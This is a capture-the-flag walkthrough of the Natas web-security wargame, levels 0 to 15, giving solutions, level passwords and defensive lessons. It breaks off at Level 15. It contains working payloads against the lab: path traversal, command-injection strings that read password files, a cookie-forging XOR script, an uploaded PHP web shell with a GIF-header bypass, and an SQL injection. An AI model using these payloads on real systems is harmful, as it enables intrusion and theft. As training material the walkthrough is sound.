# Natas Wargame

## Levels 0 - 10

### Level 0

- **Date**: 2026-03-05
- **URL**: `http://natas0.natas.labs.overthewire.org`
- **Password**: `natas0`
- **Tools**: Web Browser

#### The Solution

Right click on the page and select "View Page Source".

```html
<div id="content">
You can find the password for the next level on this page.

<!--The password for natas1 is 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq -->
</div>
```

#### The Lesson

Don't leave comments with sensitive information in your HTML source code!

---

### Level 1

- **Date**: 2026-03-05
- **URL**: `http://natas1.natas.labs.overthewire.org`
- **Password**: `0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq`
- **Tools**: Web Browser

#### The Solution

Use CTRL + U to view the page source. Or use DevTools (F12) > Elements.

```html
<div id="content">
You can find the password for the
next level on this page, but rightclicking has been blocked!

<!--The password for natas2 is TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI -->
</div>
```

#### The Lesson

Disabling right-click does **not** prevent users from viewing the page source!

---

### Level 2

- **Date**: 2026-03-05
- **URL**: `http://natas2.natas.labs.overthewire.org`
- **Password**: `TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI`
- **Tools**: Web Browser

#### The Solution

Use CTRL + U to view the page source. And notice:

```html
<div id="content">
There is nothing on this page
<img src="files/pixel.png">
</div>
```

There is a `files` directory!
Browse to `http://natas2.natas.labs.overthewire.org/files/`.
There you will find `users.txt`!

```txt
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```

#### The Lesson

Don't leave sensitive files in web-accessible directories!

---

### Level 3

- **Date**: 2026-03-07
- **URL**: `http://natas3.natas.labs.overthewire.org`
- **Password**: `3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH`
- **Tools**: Web Browser

#### The Solution

Use CTRL + U to view the page source. And notice:

```html
<div id="content">
There is nothing on this page
<!-- No more information leaks!! Not even Google will find it this time... -->
</div>
```

Search engines like Google ignore files and directories that are listed in a site's `robots.txt` file.

Browse to `http://natas3.natas.labs.overthewire.org/robots.txt`.

```txt
User-agent: *
Disallow: /s3cr3t/
```

Browse to the `http://natas3.natas.labs.overthewire.org/s3cr3t/` directory.
There is another file called `users.txt`!

```txt
natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
```

#### The Lesson

Search engines may ignore robots.txt, but hackers do **not**!

---

### Level 4

- **Date**: 2026-03-07
- **URL**: `http://natas4.natas.labs.overthewire.org`
- **Password**: `QryZXc2e0zahULdHrtHxzyYkj59kUxLQ`
- **Tools**: Web Browser, `curl`

#### The Solution

Use CTRL + U to view the page source. And notice:

```html
<div id="content">

Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
```

Authorized users should come from `http://natas5.natas.labs.overthewire.org/`.
So let's check the `Referer` header of the HTTP request.
Use the browser's DevTools (F12) > Network tab to inspect the HTTP request headers.
Notice that there is no `Referer` header.

Let's use `curl` for this!

`curl` stands for "Client URL" and is a command-line tool for making HTTP requests.

To see the headers with `curl`:
```Powershell
curl.exe -v -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ http://natas4.natas.labs.overthewire.org
```

To add the `Referer` header with `curl`:
```Powershell
curl.exe -v -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ -e http://natas5.natas.labs.overthewire.org/ http://natas4.natas.labs.overthewire.org
```

The `-e` flag is used to set the `Referer` header.

`curl` now gives the following response:
```html
<div id="content">

Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
```

#### The Lesson

Don't rely on the `Referer` header for security!

---

### Level 5

- **Date**: 2026-03-07
- **URL**: `http://natas5.natas.labs.overthewire.org`
- **Password**: `0n35PkggAPm2zbEpOU802c0x0Msn1ToK`
- **Tools**: Web Browser

#### The Solution

Use CTRL + U to view the page source. And notice:

```html
<div id="content">
Access disallowed. You are not logged in</div>
```

Even though we are logged in with the correct credentials, the page says we are not logged in.
Let's check the cookies!

Use the browser's DevTools (F12) > Application tab > Cookies and notice a cookie named `loggedin` with the value `0`.
You can just edit the value of the cookie here and set it to `1`!

Refresh the page and you will see:
```html
<div id="content">
Access granted. The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned</div>
```

#### The Lesson

Don't rely on client-side cookies for authentication!

---

### Level 6

- **Date**: 2026-03-07
- **URL**: `http://natas6.natas.labs.overthewire.org`
- **Password**: `0RoJwHdSKWFTYR5WuiAewauSuNaBXned`
- **Tools**: Web Browser

#### The Solution

Use CTRL + U to view the page source. And notice:

```html
<div id="content">


<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

Open the source code (URL/index-source.html) and notice:

```php
<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
```

Notice `include "includes/secret.inc";`.
Let's check out `URL/includes/secret.inc`:

```php
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```

Put this secret in the form and submit it. You will see:
```html
<div id="content">

Access granted. The password for natas7 is bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

#### The Lesson

Don't include sensitive information in web-accessible **PHP** files!

---

### Level 7

- **Date**: 2026-03-07
- **URL**: `http://natas7.natas.labs.overthewire.org`
- **Password**: `bmg8SvU1LizuWjx3y7xkNERkHxGre0GS`
- **Tools**: Web Browser

#### The Solution

Use CTRL + U to view the page source. And notice:

```html
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
```

Notice that the `page` parameter is being passed to `index.php`.
Maybe we can use this to read files on the server?

The hint says the password for natas8 is in `/etc/natas_webpass/natas8`.
So let's try to read that file by passing it as the `page` parameter.

Try `http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8`.

You will see:
```html
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>
xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
```

#### The Lesson

Don't use `include($_GET['page']);` in `index.php` without proper validation!

---

### Level 8

- **Date**: 2026-03-07
- **URL**: `http://natas8.natas.labs.overthewire.org`
- **Password**: `xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q`
- **Tools**: Web Browser, `PHP`

#### The Solution

Use CTRL + U to view the page source. And notice:

```html
<div id="content">


<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

Let's check out that source code (URL/index-source.html):

```php
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```

Notice the `encodeSecret` function. We can reverse it to get the original secret.

[level-08\decode.php](level-08\decode.php)
```php
<?php
$encoded = "3d3d516343746d4d6d6c315669563362";

echo base64_decode(strrev(hex2bin($encoded)));
?>
```

Run `php level-08\decode.php` and you will get `oubWYf2kBq`.

Put this secret in the form and submit it. You will see:
```html
<div id="content">

Access granted. The password for natas9 is ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
<form method=post>
```

#### The Lesson

Don't put the encoded secret and its encode function in your source code!

---

### Level 9

- **Date**: 2026-03-14
- **URL**: `http://natas9.natas.labs.overthewire.org`
- **Password**: `ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t`
- **Tools**: Web Browser, `find`, `cat`

#### The Solution

Use CTRL + U to view the page source. And notice:

```html
<div id="content">
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

Let's check out that source code (URL/index-source.html):

```php
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
</pre>
```

Notice that the `$key` variable is being passed to the `grep` command <u>without any sanitization</u>!

So we can use **command injection** to read the password file.

With `test; cat` as the needle, the command becomes `grep -i test; cat dictionary.txt`.
Try this and you will see the contents of `dictionary.txt`!

Now let's try to find a 'password' file in the system with `test ; find / -name "*natas10*" 2>/dev/null ; cat`.
And we find a `/etc/natas_webpass/natas10` file!

Let's read it with `test ; cat /etc/natas_webpass/natas10`!

And we get `t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu`.

#### The Lesson

Don't pass user input to system commands without <u>proper sanitization</u>!

### Level 10

- **Date**: 2026-03-14
- **URL**: `http://natas10.natas.labs.overthewire.org`
- **Password**: `t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu`
- **Tools**: Web Browser, `grep`

#### The Solution

Use CTRL + U to view the page source. And notice:

```html
<div id="content">

For security reasons, we now filter on certain characters<br/><br/>
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

So they learned from the previous level and added some filtering.

Let's check out that source code (URL/index-source.html):
```php
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
</pre>
```

They have blocked the `;`, `|` and `&` characters.
But they forgot that `grep` can read multiple files!

We do need to match the password in order to get the contents of `/etc/natas_webpass/natas11`.
`grep` supports regex, so we can use `.*` to match all characters!

So try `.* /etc/natas_webpass/natas11 #` as the needle and you will see the contents of `/etc/natas_webpass/natas11`!
`#` just comments out `dictionary.txt` so it's not included in the output.

And you will get `/etc/natas_webpass/natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk` in the output.

#### The Lesson

- `grep` can read multiple files!
- Don't rely on blacklisting certain characters for security!

## Levels 11 - 20

### Level 11

- **Date**: 2026-03-14
- **URL**: `http://natas11.natas.labs.overthewire.org`
- **Password**: `UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk`
- **Tools**: Web Browser, `PHP`

#### The Solution

Use CTRL + U to view the page source. And notice:

```html
<div id="content">
<body style="background: #ffffff;">
Cookies are protected with XOR encryption<br/><br/>


<form>
Background color: <input name=bgcolor value="#ffffff">
<input type=submit value="Set color">
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

Let's check out that source code (URL/index-source.html):

```php
<?

$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);



?>
```

Notice `setcookie("data", base64_encode(xor_encrypt(json_encode($d))));`.
This means that the cookie is a base64 encoded, XOR encrypted JSON string!
`XOR` encryption is **symmetric**, so we can just use the same function to decrypt it!

And notice `$mydata['showpassword'] = $tempdata['showpassword'];`.
So if we set `showpassword` to `yes` in the **cookie**, it will be shown on the page!

<u>Why is XOR symmetric?</u>

- XOR with `1`: `b ^ 1 = ~b` and `~b ^ 1 = b`
- XOR with `0`: `b ^ 0 = b` and `b ^ b = 0`
- XOR with `k`: `b ^ k = c` and `c ^ k = b`

So `plaintext XOR key = ciphertext` and `ciphertext XOR key = plaintext`.

[level-11\cookie.php](level-11\cookie.php)
```php
<?php

if ($argc < 2) {
  die("Usage: php {$argv[0]} COOKIE_VALUE\n");
}

$default_cookie = $argv[1];

$known_plaintext = json_encode([
  "showpassword" => "no",
  "bgcolor" => "#ffffff"
]);

# XOR is symmetric
# plaintext XOR key = ciphertext
# ciphertext XOR key = plaintext

# Why?
# b ^ 1 = ~b and b ^ ~b = 1
# b ^ 0 = b and b ^ b = 0
# b ^ k = c and c ^ k = b

function xor_encrypt($data, $key)
{
  $out = '';
  for ($i = 0; $i < strlen($data); $i++) {
    $out .= $data[$i] ^ $key[$i % strlen($key)];
    # $key[$i % strlen($key)] : repeats the key if it's shorter than the data!
  }
  return $out;
}

$cipher = base64_decode($default_cookie);

$key_stream = '';

for ($i = 0; $i < strlen($cipher); $i++) {
  $key_stream .= $cipher[$i] ^ $known_plaintext[$i % strlen($known_plaintext)];
}

echo "Recovered keystream: " . $key_stream . "\n";

echo "Enter key length: ";
$key_length = intval(trim(fgets(STDIN)));
$key = substr($key_stream, 0, $key_length);
echo "\nRecovered key: $key\n\n";

$new_plaintext = json_encode([
  "showpassword" => "yes",
  "bgcolor" => "#ffffff"
]);

$new_cipher = xor_encrypt($new_plaintext, $key);
$new_cookie = base64_encode($new_cipher);
echo "New cookie value: $new_cookie\n";
```

Run `php level-11\cookie.php`.
Identify how long the key is by looking for repetitions in the keystream.
And you will get the new cookie value that you can set in the browser!

```powershell
PS C:\Users\michiel\vives2\CYBERSECURITY\labo\03_NATAS\natas> php .\level-11\cookie.php HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D
Recovered keystream: eDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeL
Enter key length: 4

Recovered key: eDWo

New cookie value: HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5
```

Go to the browser's DevTools (F12) > Application tab > Cookies and set the `data` cookie to `HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5`.

Refresh the page and you will see:
```html
<div id="content">
<body style="background: #ffffff;">
Cookies are protected with XOR encryption<br/><br/>

The password for natas12 is yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB<br>
<form>
Background color: <input name=bgcolor value="#ffffff">
<input type=submit value="Set color">
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

#### The Lesson

Don't use **XOR encryption** for sensitive data because it's easily breakable with known **plaintext attacks**!

### Level 12

- **Date**: 2026-03-15
- **URL**: `http://natas12.natas.labs.overthewire.org`
- **Password**: `yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB`
- **Tools**: Web Browser, `curl`, `PHP`

#### The Solution

Use CTRL + U to view the page source. And notice:

```html
<div id="content">

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="lnpldob3zh.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

Notice `<input name="uploadedfile" type="file" /><br />`.
This means we can upload a file to the server! Like a PHP shell script...

Let's create a PHP shell script called `shell.php` with the following content:

```php
<?php system($_GET["cmd"]);
```

This script will execute the command passed in the `cmd` GET parameter and return the output.
Effectively giving us remote shell access to the server!

Let's upload this file to the server with `curl`:
```powershell
curl.exe -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB -F "uploadedfile=@shell.php" http://natas12.natas.labs.overthewire.org/
```

But the returned HTML does not contain a valid uploaded file path!

Notice `<input type="hidden" name="filename" value="lnpldob3zh.jpg" />`.
This means that the filename is sent by the browser as part of the HTTP request.
The server likely uses this value as the filename when saving the uploaded file.

So we need to set the filename to `shell.php` when uploading the file with `curl`!
```powershell
curl.exe -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB -F "filename=shell.php" -F "uploadedfile=@shell.php" http://natas12.natas.labs.overthewire.org/
```

Now we get:
```html
The file <a href="upload/4y97gpnavy.php">upload/4y97gpnavy.php</a> has been uploaded
```

Use the cmd GET parameter to run `cat /etc/natas_webpass/natas13`:
```powershell
curl.exe -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB "http://natas12.natas.labs.overthewire.org/upload/4y97gpnavy.php?cmd=cat%20/etc/natas_webpass/natas13"
```
Spaces in URLs must be encoded as `%20`.

And the `curl` command returns:
```txt
trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
```

#### The Lesson

Never trust **client‑controlled input** (such as hidden form fields) when handling file uploads.

### Level 13

- **Date**: 2026-03-16
- **URL**: `http://natas13.natas.labs.overthewire.org`
- **Password**: `trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC`
- **Tools**: Web Browser, `curl`, `PHP`

#### The Solution

Use CTRL + U to view the page source. And notice:

```html
<div id="content">
For security reasons, we now only accept image files!<br/><br/>


<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="inos8ptir9.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

Let's check out that source code (URL/index-source.html):

```php
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

    $err=$_FILES['uploadedfile']['error'];
    if($err){
        if($err === 2){
            echo "The uploaded file exceeds MAX_FILE_SIZE";
        } else{
            echo "Something went wrong :/";
        }
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>
```

Notice `exif_imagetype($_FILES['uploadedfile']['tmp_name'])`.
This function checks the MIME type of the file to see if it's a valid image.

`exif_imagetype()` reads the first bytes of an image and checks its signature.
From [https://www.php.net/manual/en/function.exif-imagetype.php](https://www.php.net/manual/en/function.exif-imagetype.php).

So we can spoof the MIME type of our `shell.php` file to make it look like a valid image file!

Our new `shell.php` file:
```php
GIF89a
<?php system($_GET['cmd']);
```

Upload the file again with `curl`:
```powershell
curl.exe -u natas13:trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC -F "filename=shell.php" -F "uploadedfile=@shell.php" http://natas13.natas.labs.overthewire.org/
```

We get:
```html
The file <a href="upload/x1ui4eh89u.php">upload/x1ui4eh89u.php</a> has been uploaded
```

And use the cmd GET parameter to run `cat /etc/natas_webpass/natas14`:
```powershell
curl.exe -u natas13:trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC "http://natas13.natas.labs.overthewire.org/upload/x1ui4eh89u.php?cmd=cat%20/etc/natas_webpass/natas14"
```

And we get:
```txt
GIF89a
z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
```

#### The Lesson

File headers can be **spoofed**, so they’re not reliable for security!

### Level 14

- **Date**: 2026-03-31
- **URL**: `http://natas14.natas.labs.overthewire.org`
- **Password**: `z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ`
- **Tools**: Web Browser, `SQL`

#### The Solution

Use CTRL + U to view the page source. And notice:

```html
<div id="content">

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

Let's check out that source code (URL/index-source.html):

```php
<?php
if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas14', '<censored>');
    mysqli_select_db($link, 'natas14');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysqli_close($link);
} else {
?>
```

Notice that the `username` and `password` parameters are being directly concatenated into the SQL query without any sanitization!

We can get all users from the database by making the query always true with `OR 1=1`:
```sql
SELECT * from users where username="" OR 1=1 # " and password=""
```
The `#` is used to comment out the rest of the query.

So fill in `username` with `" OR 1=1 #` and `password` with anything and submit the form.

And you will see:
```html
<div id="content">
Successful login! The password for natas15 is SdqIqBsFcz3yotlNYErZSZwblkm0lrvx<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

#### The Lesson

Use prepared statements to prevent **SQL injection**!

## Levels 15 - 20

### Level 15

- **Date**: 2026-03-31
- **URL**: `http://natas15.natas.labs.overthewire.org`
- **Password**: `SdqIqBsFcz3yotlNYErZSZwblkm0lrvx`
- **Tools**: Web Browser

#### The Solution

Use CTRL + U to view the page source. And notice:

```html
